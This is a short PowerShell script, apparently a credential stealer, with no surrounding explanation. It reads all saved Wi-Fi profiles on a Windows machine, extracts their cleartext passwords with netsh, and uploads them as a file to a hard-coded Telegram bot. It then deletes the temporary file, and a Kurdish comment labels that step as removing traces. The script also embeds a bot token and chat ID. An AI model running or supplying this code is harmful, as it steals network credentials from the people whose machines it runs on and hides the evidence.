$token = "8055439877:AAHqPyyYm79putLyxCDa3bED7KHTdWo1T80"
$chatId = "8597805144"
$exportPath = "$env:TEMP\w.txt"

if (Test-Path $exportPath) { Remove-Item $exportPath }

netsh wlan show profiles | Select-String ':(.+)$' | ForEach-Object {
    $name = $_.Matches.Groups[1].Value.Trim()
    $profile = netsh wlan show profile name=$name key=clear
    $pass = ($profile | Select-String 'Key Content.+:(.+)$').Matches.Groups[1].Value.Trim()
    if ($pass) {
        "$name : $pass" | Out-File $exportPath -Append
    }
}

if (Test-Path $exportPath) {
    curl.exe -F "document=@$exportPath" "https://api.telegram.org/bot$token/sendDocument?chat_id=$chatId"
    # سڕینەوەی شوێنەوار
    Remove-Item $exportPath
}
